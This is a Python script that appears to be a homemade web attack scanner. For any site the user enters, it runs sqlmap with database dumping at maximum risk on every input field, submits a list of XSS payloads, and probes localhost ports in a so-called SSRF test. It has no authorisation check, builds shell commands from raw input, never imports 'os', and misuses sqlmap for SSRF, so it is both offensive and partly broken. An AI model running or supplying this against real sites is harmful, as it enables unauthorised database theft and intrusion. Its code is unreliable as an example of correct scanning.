import requests
from colorama import Fore, Style
from bs4 import BeautifulSoup
import urllib.parse

def run_sqlmap(target, point):
    sqlmap_command = f"sqlmap -u {target}?{point}=1 --forms --dump --level=3 --risk=3"
    os.system(sqlmap_command)

target = input("Enter target website (Format: https://example.com): ")

response = requests.get(target)
soup = BeautifulSoup(response.content, 'html.parser')
input_tags = soup.find_all('input')
injection_points = []
for input_tag in input_tags:
    if 'name' in input_tag.attrs:
        injection_points.append(input_tag['name'])

print(Fore.YELLOW + "[*] Performing SQL Injection tests using SQLMap..." + Style.RESET_ALL)
for point in injection_points:
    run_sqlmap(target, point)

xss_payloads = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src='javascript:alert('XSS')'></iframe>"
]
print(Fore.YELLOW + "[*] Performing XSS Injection tests..." + Style.RESET_ALL)
for point in injection_points:
    form_url = f"{target}/form"
    form_response = requests.get(form_url)

    soup = BeautifulSoup(form_response.content, 'html.parser')
    form_fields = soup.find_all('input')

    for field in form_fields:
        if field['name'] == point:
            for payload in xss_payloads:
                field['value'] = payload

                form_data = {}
                for form_field in form_fields:
                    form_data[form_field['name']] = form_field['value']
                response = requests.post(form_url, data=form_data)

                if payload in response.content.decode():
                    print(Fore.GREEN + f"[+] Found XSS Injection vulnerability in field {field['name']} with payload: {payload}" + Style.RESET_ALL)

ssrf_payloads = [
    "127.0.0.1",
    "localhost"
]
ssrf_ports = ["80", "443", "8080", "5432"]

print(Fore.YELLOW + "[*] Performing SSRF testing using SQLMap..." + Style.RESET_ALL)
for point in injection_points:
    for payload in ssrf_payloads:
        for port in ssrf_ports:
            ssrf_command = f"sqlmap -u {target}?{point}=http://{payload}:{port} --level=3 --risk=3"
            os.system(ssrf_command)
